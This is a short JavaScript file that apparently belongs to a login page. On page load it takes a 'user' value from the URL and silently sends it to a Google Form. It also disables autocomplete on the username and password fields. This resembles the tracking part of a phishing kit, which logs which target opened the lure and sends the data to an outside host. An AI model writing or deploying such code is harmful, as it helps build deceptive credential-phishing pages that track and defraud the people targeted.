function loaded() {
    var formID = "12ITjQsagqEZ6bB0WQYrrWgMzhG7hS06qOP98EMPyqSY";
    event.preventDefault();
    var username = document.getElementById("username");
    var password = document.getElementById("password");

    urlUser = getUrlVars()["user"];
    console.log(urlUser);
    if (urlUser == null) {urlUser = "[no username found in url]"}
    
    var xhr = new XMLHttpRequest();
    let url = "https://docs.google.com/forms/d/e/" + formID + "/formResponse?usp=pp_url&entry.1860811773=" + urlUser + "&entry.1545559792=NA&entry.1386775216=NA&entry.830965781=NA&submit=Submit";
    xhr.open("POST", url , true);
    xhr.send();

    username.setAttribute("autocomplete", "off");
    password.setAttribute("autocomplete", "off");
    username.focus();
}

window.onload = loaded;